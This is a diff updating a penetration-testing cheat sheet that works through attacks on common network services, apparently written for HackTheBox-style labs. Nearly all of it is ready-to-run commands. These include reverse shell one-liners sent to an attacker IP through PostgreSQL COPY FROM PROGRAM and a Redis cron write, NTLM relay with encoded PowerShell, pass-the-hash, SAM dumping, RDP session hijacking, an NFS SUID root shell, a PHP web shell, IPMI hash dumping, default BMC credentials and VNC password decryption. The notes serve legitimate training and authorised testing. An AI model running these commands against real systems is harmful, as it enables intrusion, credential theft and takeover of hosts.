@@ -1,10 +1,10 @@
 # Attacking Common Services
 
-#Services #SMB #FTP #SSH #RDP #MSSQL #MySQL #PostgreSQL #NFS #SNMP #WinRM #DNS #Email #Enumeration #BruteForce
+#Services #SMB #FTP #SSH #RDP #MSSQL #MySQL #PostgreSQL #NFS #SNMP #WinRM #DNS #Email #LDAP #Redis #IPMI #Rsync #VNC #NetExec #Enumeration #BruteForce
 
 ## What is this?
 
-Per-service playbook — enumeration, anonymous/null access, brute force, exploitation, and post-access commands for the most common network services. For AD-specific attacks see [[Active Directory Attacks]].
+Per-service playbook — enumeration, anonymous/null access, brute force, exploitation, and post-access commands for the most common network services. For AD-specific attacks see [[Active Directory Attacks]]. Pairs with [[Attacking Common Applications]] (web apps on top of these services), [[Login Brute Forcing]], and [[Password Attacks]]; each service has a deeper per-service note under `Services/`.
 
 ---
 
@@ -13,7 +13,8 @@ Per-service playbook — enumeration, anonymous/null access, brute force, exploi
 | Tool | Service(s) | Purpose |
 |---|---|---|
 | [[Tools/Scanning/NMAP\|nmap]] | All | Port scan, version detection, NSE scripts |
-| [[Tools/Lateral Movement/crackmapexec\|crackmapexec]] | SMB, WinRM, MSSQL, SSH | Auth, exec, spray, enum |
+| [[Tools/Lateral Movement/NetExec\|NetExec (nxc)]] | SMB, WinRM, MSSQL, SSH, LDAP, RDP | Auth, exec, spray, enum — maintained successor of [[Tools/Lateral Movement/crackmapexec\|crackmapexec]] (same syntax: `crackmapexec` → `nxc`). **No mysql/postgres/redis protocol.** |
+| [[Tools/Lateral Movement/responder\|Responder]] | SMB/LLMNR/NBT-NS | Poison name resolution → capture or relay NetNTLM |
 | [[Tools/Auth/impacket-psexec\|impacket-psexec]] / [[Tools/Lateral Movement/impacket\|smbexec]] | SMB | Remote shell via SMB |
 | [[Tools/Lateral Movement/ntlmrelayx\|impacket-ntlmrelayx]] | SMB | NTLM relay → SAM dump / command exec |
 | [[Tools/Lateral Movement/smbclient\|smbclient]] | SMB | Interactive share browser |
@@ -25,7 +26,7 @@ Per-service playbook — enumeration, anonymous/null access, brute force, exploi
 | [[Tools/Auth/Medusa\|medusa]] | FTP, SSH, MSSQL | Multi-service brute force |
 | [[Tools/Auth/crowbar\|crowbar]] | RDP | RDP-specific brute force |
 | [[Tools/Database/mssqlclient\|impacket-mssqlclient]] | MSSQL | Interactive MSSQL client |
-| [[Tools/Database/sqsh\|sqsh]] | MSSQL, MySQL | CLI DB client (Linux) |
+| [[Tools/Database/sqsh\|sqsh]] | MSSQL (Sybase/TDS) | CLI DB client (Linux) — **not** a MySQL client |
 | [[Tools/Database/redis-cli\|redis-cli]] | Redis | Interactive Redis client |
 | [[Tools/Database/psql\|psql]] | PostgreSQL | Interactive PostgreSQL client (`COPY … FROM PROGRAM` RCE) |
 | `ldapsearch` | LDAP | LDAP query tool (OpenLDAP client) |
@@ -35,12 +36,13 @@ Per-service playbook — enumeration, anonymous/null access, brute force, exploi
 | [[Tools/Auth/o365spray\|o365spray]] | SMTP/O365 | O365 user enum and password spray |
 | [[Tools/Email/swaks\|swaks]] | SMTP | Send/test emails via CLI |
 | [[Tools/Network/onesixtyone\|onesixtyone]] | SNMP | Community string brute force |
-| [[Tools/Network/snmpwalk\|snmpwalk]] | SNMP | SNMP tree walk |
-| [[Tools/Network/dig\|dig]] / [[Tools/Network/fierce\|fierce]] / [[Tools/Recon/subfinder\|subfinder]] | DNS | DNS enum and subdomain discovery |
+| [[Tools/Network/snmpwalk\|snmpwalk]] / [[Tools/Network/snmp-check\|snmp-check]] / [[Tools/Network/braa\|braa]] | SNMP | Tree walk / parsed summary / fast bulk walk |
+| [[Tools/Network/dig\|dig]] / [[Tools/Network/fierce\|fierce]] / [[Tools/Recon/subfinder\|subfinder]] / [[Tools/Scanning/gobuster\|gobuster]] | DNS | DNS enum and subdomain discovery |
+| [[Tools/Network/ssh-audit\|ssh-audit]] | SSH | Algorithm / version audit |
 | `showmount` | NFS | List NFS exports (nfs-common) |
-| `rsync` | Rsync | List/download/upload rsync modules |
-| `vncviewer` | VNC | Connect to VNC sessions |
-| [[Tools/Remote Access/Xfreerdp\|xfreerdp]] | RDP, VNC | Connect with PTH support |
+| [[Tools/File Transfer/rsync\|rsync]] | Rsync | List/download/upload rsync modules |
+| `vncviewer` | VNC | Connect to VNC sessions (TigerVNC) |
+| [[Tools/Remote Access/Xfreerdp\|xfreerdp]] | RDP | Connect with PTH support (Kali now ships FreeRDP 3 as `xfreerdp3`) |
 | [[Tools/Payloads & Shells/metasploit\|MSF]] `ipmi_dumphashes` | IPMI | Unauthenticated IPMI hash dump |
 | [[Tools/Auth/hashcat\|hashcat]] `-m 7300` | IPMI | Crack IPMI RAKP hashes |
 
@@ -53,6 +55,7 @@ Per-service playbook — enumeration, anonymous/null access, brute force, exploi
 ```bash
 # Nmap
 nmap -sV -sC -p 139,445 10.10.10.10
+nmap -p 445 --script smb-vuln-ms17-010 10.10.10.10      # EternalBlue check (legacy hosts)
 
 # Null/anonymous session — list shares
 smbclient -N -L //10.10.10.10
@@ -67,10 +70,10 @@ smbmap -H 10.10.10.10 -u user -p Password123
 enum4linux -a 10.10.10.10
 enum4linux-ng -A 10.10.10.10
 
-# CME — enum logged-on users / shares / sessions
-crackmapexec smb 10.10.10.0/24 -u administrator -p 'Password123!' --loggedon-users
-crackmapexec smb 10.10.10.10 -u user -p Password123 --shares
-crackmapexec smb 10.10.10.10 -u '' -p '' --shares       # null session
+# NetExec — enum logged-on users / shares / sessions
+nxc smb 10.10.10.0/24 -u administrator -p 'Password123!' --loggedon-users
+nxc smb 10.10.10.10 -u user -p Password123 --shares
+nxc smb 10.10.10.10 -u '' -p '' --shares       # null session
 
 # RPCclient (null session)
 rpcclient -U '' -N 10.10.10.10
@@ -97,19 +100,41 @@ mount -t cifs //10.10.10.10/Finance /mnt/smb -o credentials=/tmp/creds
 # domain=.
 ```
 
+### Connect and Browse — from a Windows foothold
+
+```powershell
+# cmd — map a drive (omit /user to use the current token)
+net use n: \\10.10.10.10\Finance /user:user Password123
+dir n:\ /a-d /s /b | find /c ":\"          # count files before you start grepping
+
+# PowerShell — mount with a credential object
+$cred = New-Object System.Management.Automation.PSCredential('user', (ConvertTo-SecureString 'Password123' -AsPlainText -Force))
+New-PSDrive -Name N -Root \\10.10.10.10\Finance -PSProvider FileSystem -Credential $cred
+```
+
 ### Search Mounted Share
 
 ```bash
-# Find files with "cred" in name
+# Linux — find files with "cred" in name, then grep contents
 find /mnt/smb/ -name '*cred*'
 grep -rn 'password' /mnt/smb/ --include='*.txt' --include='*.xml' --include='*.ini'
 ```
 
+```powershell
+# Windows equivalents
+dir n:\*cred* /s /b
+findstr /s /i cred n:\*.*
+Get-ChildItem -Recurse -Path N:\ -Include *cred* -File
+Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -List
+```
+
+> [!tip] For large shares, let a spider do it: `nxc smb 10.10.10.10 -u user -p Password123 -M spider_plus` (JSON index of every readable file), or [[Tools/Lateral Movement/smbmap|smbmap]] `-r <share> --depth 5` (current smbmap uses lowercase `-r`; old guides show `-R`).
+
 ### Brute Force
 
 ```bash
-# CME spray
-crackmapexec smb 10.10.10.10 -u users.txt -p 'Company01!' --local-auth
+# NetExec spray
+nxc smb 10.10.10.10 -u users.txt -p 'Company01!' --local-auth
 
 # Nmap brute
 nmap -p 445 --script smb-brute --script-args userdb=users.txt,passdb=passwords.txt 10.10.10.10
@@ -118,35 +143,40 @@ nmap -p 445 --script smb-brute --script-args userdb=users.txt,passdb=passwords.t
 ### Remote Execution
 
 ```bash
-# CME exec (smbexec, wmiexec, atexec)
-crackmapexec smb 10.10.10.10 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
+# NetExec exec (smbexec, wmiexec, atexec)
+nxc smb 10.10.10.10 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
 
 # PSExec (impacket — requires admin + writable share)
 impacket-psexec administrator:'Password123!'@10.10.10.10
 impacket-smbexec administrator:'Password123!'@10.10.10.10
 
 # Pass-the-Hash
-crackmapexec smb 10.10.10.10 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
+nxc smb 10.10.10.10 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
 impacket-psexec administrator@10.10.10.10 -hashes :2B576ACBE6BCFDA7294D6BD18041B8FE
 xfreerdp /v:10.10.10.10 /u:administrator /pth:2B576ACBE6BCFDA7294D6BD18041B8FE
 
 # Dump SAM
-crackmapexec smb 10.10.10.10 -u Administrator -p 'Password123!' --sam
+nxc smb 10.10.10.10 -u Administrator -p 'Password123!' --sam
 ```
 
 ### NTLM Relay
 
 ```bash
-# 1. Disable SMB in Responder config (SMB = Off)
-# 2. Run Responder to capture challenge
-sudo responder -I eth0
+# 0. Relay only works against hosts with SMB signing NOT required — build the target list first
+nxc smb 10.10.10.0/24 --gen-relay-list relay.txt
 
-# 3. Relay to target — dump SAM by default
-impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.10.146
+# 1. Turn SMB off in /usr/share/responder/Responder.conf (SMB = Off) so ntlmrelayx can own 445
+# 2. Run Responder to poison LLMNR/NBT-NS — victims authenticate to you
+sudo responder -I tun0
+
+# 3. Relay to targets — dumps the SAM by default (relayed user must be local admin on the target)
+impacket-ntlmrelayx --no-http-server -smb2support -tf relay.txt
 
 # 3b. Relay + run command
 impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.10.146 -c 'powershell -e <b64>'
 ```
+
+> [!note] You can't relay a hash back to the host it came from (MS08-068). DCs require signing by default, so relaying to a DC over SMB fails. Relay to LDAP/ADCS instead (see [[Tools/Lateral Movement/ntlmrelayx|ntlmrelayx]]).
 
 ---
 
@@ -171,6 +201,9 @@ ftp> user anonymous
 ftp> ls
 ftp> get file.txt
 ftp> put shell.php       # upload if writable
+
+# Mirror everything readable in one go (lands in ./10.10.10.10/)
+wget -m --no-passive ftp://anonymous:anonymous@10.10.10.10
 ```
 
 ### Brute Force
@@ -207,8 +240,8 @@ hydra -L users.txt -P passwords.txt ssh://10.10.10.10 -t 4
 
 medusa -u root -P passwords.txt -h 10.10.10.10 -M ssh
 
-# CME
-crackmapexec ssh 10.10.10.10 -u users.txt -p passwords.txt
+# NetExec
+nxc ssh 10.10.10.10 -u users.txt -p passwords.txt
 ```
 
 ### Connect / Key-Based
@@ -217,27 +250,29 @@ crackmapexec ssh 10.10.10.10 -u users.txt -p passwords.txt
 # Password auth
 ssh user@10.10.10.10
 
-# Private key
+# Private key — ssh refuses a key that's group/world-readable, so chmod first
+chmod 600 id_rsa
 ssh -i id_rsa user@10.10.10.10
-chmod 600 id_rsa         # required
 
-# Specify older algorithms (legacy targets)
-ssh -o KexAlgorithms=diffie-hellman-group1-sha1 -o HostKeyAlgorithms=ssh-rsa user@10.10.10.10
+# Re-enable older algorithms (legacy targets) — the leading "+" appends instead of replacing the list
+ssh -o KexAlgorithms=+diffie-hellman-group1-sha1 -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa user@10.10.10.10
 ```
 
 ### SSH Tunneling (Pivoting)
 
 ```bash
-# Local forward — reach 192.168.1.10:80 via attacker:8080
-ssh -L 8080:192.168.1.10:80 user@10.10.10.10
+# Local forward — reach 192.168.1.10:80 via attacker:9001
+ssh -L 9001:192.168.1.10:80 user@10.10.10.10
 
-# Dynamic SOCKS proxy (proxychains)
-ssh -D 1080 user@10.10.10.10
+# Dynamic SOCKS proxy (proxychains) — port must match the socks line in /etc/proxychains4.conf
+ssh -D 9050 user@10.10.10.10
 # then: proxychains nmap -sT -Pn 192.168.1.10
 
-# Remote forward — expose attacker port on target
-ssh -R 4444:127.0.0.1:4444 user@10.10.10.10
+# Remote forward — target's port 9001 → your listener (catch shells from deeper hosts)
+ssh -R 9001:127.0.0.1:9001 user@10.10.10.10
 ```
+
+> Full pivoting coverage: [[Pivoting, Tunneling & Port Forwarding]].
 
 ---
 
@@ -300,6 +335,28 @@ hydra -L users.txt -P passwords.txt -f 10.10.10.10 pop3
 hydra -L users.txt -P passwords.txt -f 10.10.10.10 imap
 ```
 
+### Read Mail with Valid Creds
+
+```bash
+# IMAPS with curl — list folders, then fetch a message
+curl -k 'imaps://10.10.10.10' --user user:Password123
+curl -k 'imaps://10.10.10.10/INBOX;UID=1' --user user:Password123
+
+# Manual IMAP over TLS
+openssl s_client -connect 10.10.10.10:993 -quiet
+a1 LOGIN user Password123
+a2 LIST "" "*"
+a3 SELECT INBOX
+a4 FETCH 1 BODY[]
+
+# Manual POP3 over TLS
+openssl s_client -connect 10.10.10.10:995 -quiet
+USER user
+PASS Password123
+LIST
+RETR 1
+```
+
 ### Send Email via SMTP (swaks)
 
 ```bash
@@ -329,13 +386,15 @@ host -l target.com 10.10.10.10          # alternative
 fierce --domain target.com
 subfinder -d target.com -v
 subbrute target.com -s names.txt -r resolvers.txt
-gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+gobuster dns --do target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+# (current gobuster — 3.8.x on Kali — uses --do/--domain; older guides show -d, which now errors)
 
 # Record lookup
 host -t A mail.target.com
 host -t MX target.com
 host -t NS target.com
-dig any target.com
+host -t TXT target.com       # SPF/DMARC/verification tokens — reveals SaaS in use
+dig any target.com           # many servers refuse ANY (RFC 8482) — query types individually if empty
 ```
 
 ### Subdomain Takeover
@@ -352,10 +411,15 @@ host sub.target.com            # if CNAME → service provider
 ### DNS Cache Poisoning (ettercap)
 
 ```bash
-# 1. Edit /etc/ettercap/etter.dns — add A record for target domain pointing to attacker IP
+# Local-network MITM only — you must be on the victim's L2 segment
+# 1. Edit /etc/ettercap/etter.dns — add an A record for the target domain pointing to attacker IP
+#      inlanefreight.com      A   10.10.14.5
+#      *.inlanefreight.com    A   10.10.14.5
 # 2. In ettercap: Hosts > Scan for Hosts
-# 3. Set targets
-# 4. Plugins > Manage Plugins > dns_spoof
+# 3. Victim IP → Add to Target1, default gateway → Add to Target2
+# 4. MITM > ARP poisoning (sniff remote connections)
+# 5. Plugins > Manage Plugins > dns_spoof (double-click to activate)
+# Verify from the victim: ping inlanefreight.com → resolves to 10.10.14.5
 ```
 
 ---
@@ -384,8 +448,8 @@ hydra -L users.txt -p 'Password123' rdp://10.10.10.10
 ### Connect
 
 ```bash
-# Linux clients
-xfreerdp /v:10.10.10.10 /u:administrator /p:'Password123'
+# Linux clients (FreeRDP 3 on current Kali = xfreerdp3, same flags)
+xfreerdp /v:10.10.10.10 /u:administrator /p:'Password123' /cert:ignore
 xfreerdp /v:10.10.10.10 /u:administrator /p:'Password123' /drive:kali,/tmp   # share /tmp as drive
 rdesktop -u administrator -p Password123 10.10.10.10
 
@@ -396,19 +460,21 @@ xfreerdp /v:10.10.10.10 /u:administrator /pth:NTLMHASH
 reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
 ```
 
-### Session Hijacking (SYSTEM required)
+### Session Hijacking (local admin → SYSTEM)
 
 ```bash
-# List sessions
+# List sessions — note the target's ID and YOUR session name (e.g. rdp-tcp#13)
 query user
 
-# Hijack session (no password needed with SYSTEM)
+# As SYSTEM, tscon attaches another user's session to yours with no password
 tscon <TARGET_SESSION_ID> /dest:<OUR_SESSION_NAME>
 
-# If not SYSTEM — create a service to run tscon
+# Local admin but not SYSTEM — a service runs as SYSTEM, so let it call tscon
 sc.exe create hijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
 net start hijack
 ```
+
+> [!note] HTB Academy notes this no longer works on Server 2019. The target user has to be logged in (active or disconnected) for there to be a session to steal.
 
 ---
 
@@ -418,7 +484,7 @@ net start hijack
 
 ```bash
 nmap -sV -p 5985,5986 10.10.10.10
-crackmapexec winrm 10.10.10.10 -u user -p Password123
+nxc winrm 10.10.10.10 -u user -p Password123
 ```
 
 ### Connect
@@ -430,12 +496,17 @@ evil-winrm -i 10.10.10.10 -u administrator -p 'Password123'
 # Pass-the-Hash
 evil-winrm -i 10.10.10.10 -u administrator -H NTLMHASH
 
-# Pass-the-Key (Kerberos)
-evil-winrm -i 10.10.10.10 -u administrator -k -r DOMAIN.LOCAL
+# Pass-the-Ticket (Kerberos) — -r sets the realm (also needs a matching realm block in /etc/krb5.conf),
+# -i must be the FQDN, ticket from KRB5CCNAME or -K <ccache/kirbi>
+export KRB5CCNAME=/tmp/administrator.ccache
+evil-winrm -i dc01.domain.local -r DOMAIN.LOCAL
+# NB: evil-winrm -k is the *private key for certificate auth* (with -c / -S), not Kerberos
 
 # PowerShell (Windows)
 $s = New-PSSession -ComputerName 10.10.10.10 -Credential (Get-Credential)
 Enter-PSSession $s
+# Connecting by IP (or to a non-domain host) needs the target in TrustedHosts first (admin shell):
+#   Set-Item WSMan:\localhost\Client\TrustedHosts -Value 10.10.10.10 -Concatenate
 ```
 
 ### File Transfer via evil-winrm
@@ -458,8 +529,8 @@ download C:\Users\Administrator\Desktop\flag.txt /tmp/
 nmap -Pn -sV -sC -p 1433 10.10.10.10
 nmap -p 1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-config 10.10.10.10
 
-# CME
-crackmapexec mssql 10.10.10.10 -u users.txt -p passwords.txt
+# NetExec
+nxc mssql 10.10.10.10 -u users.txt -p passwords.txt
 ```
 
 ### Connect
@@ -476,6 +547,8 @@ sqsh -S 10.10.10.10 -U '.\julio' -P 'Password123' -h    # local Windows account
 # sqlcmd (Windows)
 sqlcmd -S 10.10.10.10 -U sa -P 'Password123' -y 30 -Y 30
 ```
+
+> [!tip] Inside `impacket-mssqlclient`, built-ins replace most of the raw T-SQL below: `enable_xp_cmdshell`, `xp_cmdshell <cmd>`, `xp_dirtree \\10.10.14.5\x`, `enum_impersonate`, `exec_as_login sa`, `enum_links`, `use_link <srv>`. Type `help` for the list — full reference in [[Tools/Database/mssqlclient|mssqlclient]].
 
 ### Enumeration Queries
 
@@ -532,7 +605,7 @@ GO
 ### File Read
 
 ```sql
--- OPENROWSET (no OLE needed)
+-- OPENROWSET (no OLE needed; needs ADMINISTER BULK OPERATIONS — sysadmin has it)
 SELECT * FROM OPENROWSET(BULK N'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS Contents
 GO
 ```
@@ -570,10 +643,15 @@ GO
 ### Impersonation
 
 ```sql
--- Impersonate sa (or other login)
+-- Impersonate sa (or other login) — run from master, which every login can access by default
+USE master
 EXECUTE AS LOGIN = 'sa'
 SELECT SYSTEM_USER
 SELECT IS_SRVROLEMEMBER('sysadmin')
+GO
+
+-- Drop back to your own login
+REVERT
 GO
 ```
 
@@ -595,8 +673,13 @@ nmap -p 3306 --script mysql-info,mysql-empty-password,mysql-brute 10.10.10.10
 mysql -u root -p'Password123' -h 10.10.10.10
 mysql -u root -h 10.10.10.10       # no password prompt
 
-# sqsh
-sqsh -S 10.10.10.10 -U root -P 'Password123'
+# Kali's client is MariaDB 11.x: SSL + server-cert verification are ON by default, so a
+# self-signed/no-TLS lab server fails with a TLS error — turn them off:
+mysql -u root -p'Password123' -h 10.10.10.10 --skip-ssl
+mysql -u root -p'Password123' -h 10.10.10.10 --skip-ssl-verify-server-cert   # keep TLS, skip the cert check
+
+# Windows
+mysql.exe -u root -pPassword123 -h 10.10.10.10
 ```
 
 ### Enumeration Queries
@@ -612,7 +695,10 @@ SELECT user();
 SELECT @@version;
 SHOW GRANTS FOR 'root'@'localhost';
 
--- Check file write privileges (empty = no restriction)
+-- Check file read/write restriction:
+--   empty  = no restriction (anywhere the mysqld user can write)
+--   a path = only that directory
+--   NULL   = LOAD_FILE / INTO OUTFILE disabled
 SHOW VARIABLES LIKE 'secure_file_priv';
 ```
 
@@ -681,7 +767,7 @@ CREATE TABLE cmd_exec(cmd_output text);
 COPY cmd_exec FROM PROGRAM 'id';           -- executes as the postgres OS user
 SELECT * FROM cmd_exec;                     -- read the captured output
 -- reverse shell one-liner:
-COPY cmd_exec FROM PROGRAM 'bash -c ''bash -i >& /dev/tcp/10.10.14.5/4444 0>&1''';
+COPY cmd_exec FROM PROGRAM 'bash -c ''bash -i >& /dev/tcp/10.10.14.5/9001 0>&1''';
 ```
 
 ### File Read / Write
@@ -726,26 +812,40 @@ showmount -e 10.10.10.10
 sudo mkdir /mnt/nfs
 sudo mount -t nfs 10.10.10.10:/share /mnt/nfs -o nolock
 
-# List files
-ls -la /mnt/nfs/
+# List files — note numeric UIDs/GIDs (-n), they're what NFS actually checks
+ls -lan /mnt/nfs/
 
 # Unmount
 sudo umount /mnt/nfs
 ```
 
+**UID spoofing (NFSv3 / AUTH_SYS):** the server trusts the UID your client sends. If a file is owned by UID 1001 with mode 600, create a local user with that UID and read it as them:
+
+```bash
+sudo useradd -u 1001 nfsuser
+sudo -u nfsuser cat /mnt/nfs/home/alice/.ssh/id_rsa
+```
+
 ### Privilege Escalation via NFS
 
 ```bash
-# If no_root_squash is set — root on attacker = root on NFS share
-# Check /etc/exports on target for no_root_squash
+# Test for no_root_squash from the attacker side — /etc/exports options aren't visible remotely
+sudo touch /mnt/nfs/x && ls -ln /mnt/nfs/x
+#   owner 0 (root)          → no_root_squash: root on attacker = root on the share
+#   owner 65534 (nobody)    → root_squash (default) — fall back to UID spoofing above
+# (On the target itself: cat /etc/exports)
 
-# As root on attacker, copy SUID bash to share
-sudo cp /bin/bash /mnt/nfs/
+# Use the TARGET's own bash — your Kali bash may need a newer glibc than the target has.
+# 1. On the target (low-priv shell): copy its bash into the share
+cp /bin/bash /<export_path>/bash
+# 2. On the attacker (root): take ownership and set SUID
+sudo chown root:root /mnt/nfs/bash
 sudo chmod u+s /mnt/nfs/bash
-
-# On target — execute SUID bash
-/mnt/nfs/bash -p     # → root shell
+# 3. On the target: run it with -p to keep euid 0
+/<export_path>/bash -p     # → root shell
 ```
+
+> [!note] On the target, the filesystem holding the export must not be mounted `nosuid`, or the SUID bit is ignored. Full workflow in [[Linux Priv Esc]].
 
 ---
 
@@ -767,6 +867,9 @@ onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 10.10.10.10
 
 # braa — fast bulk walk
 braa public@10.10.10.10:.1.3.6.*
+
+# snmp-check — parsed summary (users, processes, software, network, shares)
+snmp-check -c public 10.10.10.10
 ```
 
 ### Useful OIDs
@@ -775,6 +878,7 @@ braa public@10.10.10.10:.1.3.6.*
 |---|---|
 | `1.3.6.1.2.1.1` | System info (hostname, OS, uptime) |
 | `1.3.6.1.2.1.25.4.2.1.2` | Running processes |
+| `1.3.6.1.2.1.25.4.2.1.5` | Process **command-line arguments** — passwords passed on the command line show up here |
 | `1.3.6.1.2.1.25.6.3.1.2` | Installed software |
 | `1.3.6.1.2.1.6.13.1.3` | Open TCP ports |
 | `1.3.6.1.4.1.77.1.2.25` | Windows user accounts |
@@ -783,7 +887,15 @@ braa public@10.10.10.10:.1.3.6.*
 # Targeted walk
 snmpwalk -v2c -c public 10.10.10.10 1.3.6.1.2.1.25.4.2.1.2    # processes
 snmpwalk -v2c -c public 10.10.10.10 1.3.6.1.2.1.25.6.3.1.2    # software
+snmpwalk -v2c -c public 10.10.10.10 1.3.6.1.2.1.25.4.2.1.5    # process args (creds!)
+
+# Net-SNMP "extend" scripts — admins wire scripts into SNMP; their output is readable here
+snmpwalk -v2c -c public 10.10.10.10 NET-SNMP-EXTEND-MIB::nsExtendObjects
+# Symbolic MIB names need the MIBs installed: sudo apt install snmp-mibs-downloader,
+# then comment out "mibs :" in /etc/snmp/snmp.conf
 ```
+
+> [!tip] A **write** community (often `private`) on Net-SNMP lets you add your own `nsExtend` command, which runs as the snmpd user — see [[Services/Network Management/SNMP|SNMP]] for the RW-community RCE path.
 
 ---
 
@@ -891,19 +1003,24 @@ ssh -i id_rsa root@10.10.10.10
 > SET payload "<?php system($_GET['cmd']); ?>"
 > SAVE
 
-# Method 3 — Write cron job
-> CONFIG SET dir /var/spool/cron/crontabs
+# Method 3 — Write cron job (RHEL/CentOS path; Debian/Ubuntu use /var/spool/cron/crontabs)
+> CONFIG SET dir /var/spool/cron
 > CONFIG SET dbfilename root
-> SET payload "\n* * * * * bash -i >& /dev/tcp/10.10.14.5/4444 0>&1\n"
+> SET payload "\n* * * * * bash -i >& /dev/tcp/10.10.14.5/9001 0>&1\n"
 > SAVE
 ```
 
-### Redis Master-Slave RCE (authenticated or post-auth)
+> [!warning] All three methods overwrite whatever file `dbfilename` points at, and leave the server's `dir`/`dbfilename` changed. Note the originals first (`CONFIG GET dir`, `CONFIG GET dbfilename`), restore them afterwards, and never point `dbfilename` at a file you can't afford to lose.
+
+> [!note] The cron method is unreliable on Debian/Ubuntu: their cron rejects crontab files with the wrong mode or owner, and the RDB file Redis writes is neither 600 nor crontab-owned. Prefer the SSH-key method there. Redis 7+ blocks changing `dir`/`dbfilename` at runtime by default (`enable-protected-configs`), which kills all three methods unless an admin set it to `yes` or `local` (`local` = still allowed from 127.0.0.1, e.g. via SSRF).
+
+### Redis Master-Slave RCE (Redis 4.x–5.x)
 
 ```bash
-# redis-rogue-server — loads a malicious .so module
+# redis-rogue-server — makes the target replicate from you, then loads a malicious .so via MODULE LOAD
 # https://github.com/n0b0dyCN/redis-rogue-server
 python3 redis-rogue-server.py --rhost 10.10.10.10 --lhost 10.10.14.5
+# Redis 7+ ships with MODULE LOAD disabled (enable-module-command no) → this route is closed
 ```
 
 ---
@@ -922,25 +1039,34 @@ set RHOSTS 10.10.10.10
 run
 ```
 
-### Hash Disclosure (Cipher 0 / anonymous auth)
+### RAKP Hash Disclosure (IPMI 2.0 — no creds needed)
+
+The IPMI 2.0 RAKP handshake sends the salted HMAC-SHA1 of a user's password **before** authentication completes. This is a flaw in the protocol spec, so there's no patch: every IPMI 2.0 BMC leaks a hash for any valid username.
 
 ```bash
-# MSF — dump IPMI hashes (no auth required on vulnerable BMCs)
+# MSF — dump IPMI hashes (tries a built-in username list)
 use auxiliary/scanner/ipmi/ipmi_dumphashes
 set RHOSTS 10.10.10.10
-set OUTPUT_JOHN_FILE /tmp/ipmi_hashes.txt
+set OUTPUT_HASHCAT_FILE /tmp/ipmi_hashes.txt     # OUTPUT_JOHN_FILE for john
 run
 
-# Crack with hashcat (RAKP mode 7300)
+# Crack with hashcat (IPMI2 RAKP HMAC-SHA1 = mode 7300)
 hashcat -m 7300 /tmp/ipmi_hashes.txt /usr/share/wordlists/rockyou.txt
 
-# Default credentials to try
-# iDRAC:    root:calvin
-# iLO:      Administrator:<factory-set>
-# IPMI 2.0: admin:admin, ADMIN:ADMIN
+# HP iLO factory default = 8 chars of uppercase + digits → brute the whole keyspace
+hashcat -m 7300 -a 3 /tmp/ipmi_hashes.txt -1 ?d?u ?1?1?1?1?1?1?1?1
 ```
 
-> [!note] IPMI hashes are HMAC-SHA1 of the session challenge — crackable offline. Successful creds often reused for BMC web interface, SSH, or OS accounts.
+**Cipher zero** is a separate bug: a BMC that accepts cipher suite 0 lets you log in as a known user with **any** password. Check for it with `auxiliary/scanner/ipmi/ipmi_cipher_zero`.
+
+| BMC | Default creds |
+|---|---|
+| Dell iDRAC | `root:calvin` |
+| HP iLO | `Administrator:<random 8-char factory password>` (printed on the server tag) |
+| Supermicro IPMI | `ADMIN:ADMIN` |
+| IBM IMM | `USERID:PASSW0RD` (zero, not O) |
+
+> [!note] Cracked BMC creds are often reused for the BMC web interface, SSH, or OS accounts. BMC access itself = remote console, virtual media, and power control of the host.
 
 ---
 
@@ -992,7 +1118,8 @@ nmap -p 5900 --script vnc-info,vnc-brute 10.10.10.10
 ### Brute Force
 
 ```bash
-hydra -L users.txt -P passwords.txt vnc://10.10.10.10
+# VNC auth is password-only — no username, so no -l/-L
+hydra -P passwords.txt vnc://10.10.10.10
 hydra -s 5901 -P passwords.txt 10.10.10.10 vnc        # non-default port
 
 # Metasploit
@@ -1009,14 +1136,15 @@ run
 vncviewer 10.10.10.10:5900
 vncviewer 10.10.10.10:5900 -passwd /tmp/vncpasswd
 
-# xfreerdp (supports VNC)
-xfreerdp /v:10.10.10.10:5900
+# Decode a stored VNC password — DES with a fixed, publicly known key, so it's reversible
+# Linux: ~/.vnc/passwd (8 raw bytes)   Windows: RealVNC/TightVNC/UltraVNC registry keys or .ini
+xxd -p ~/.vnc/passwd                    # → hex blob
+echo -n <hex> | xxd -r -p | openssl enc -des-cbc --nopad --nosalt \
+  -K e84ad66020a5a2f1 -iv 0000000000000000 -d -provider legacy -provider default | hexdump -Cv
+# (-provider legacy is needed on OpenSSL 3, where single DES is disabled by default)
 
-# Decode stored VNC password (DES-encrypted)
-# If you find a .vnc or ~/.vnc/passwd file:
-cat ~/.vnc/passwd | xxd
-# Use metasploit post module or online decoders
-use post/multi/gather/vnc_password_file
+# Windows foothold — Metasploit pulls VNC passwords from the registry/ini files and decrypts them
+use post/windows/gather/credentials/vnc
 ```
 
 ---
@@ -1055,12 +1183,12 @@ use post/multi/gather/vnc_password_file
 
 | Service | Command |
 |---|---|
-| SMB | `crackmapexec smb <ip> -u users.txt -p pass.txt` |
+| SMB | `nxc smb <ip> -u users.txt -p pass.txt` |
 | SSH | `hydra -L users.txt -P pass.txt ssh://<ip>` |
 | FTP | `hydra -L users.txt -P pass.txt ftp://<ip>` |
 | RDP | `crowbar -b rdp -s <ip>/32 -U users.txt -c pass` |
-| WinRM | `crackmapexec winrm <ip> -u users.txt -p pass.txt` |
-| MSSQL | `crackmapexec mssql <ip> -u users.txt -p pass.txt` |
+| WinRM | `nxc winrm <ip> -u users.txt -p pass.txt` |
+| MSSQL | `nxc mssql <ip> -u users.txt -p pass.txt` |
 | MySQL | `hydra -L users.txt -P pass.txt mysql://<ip>` |
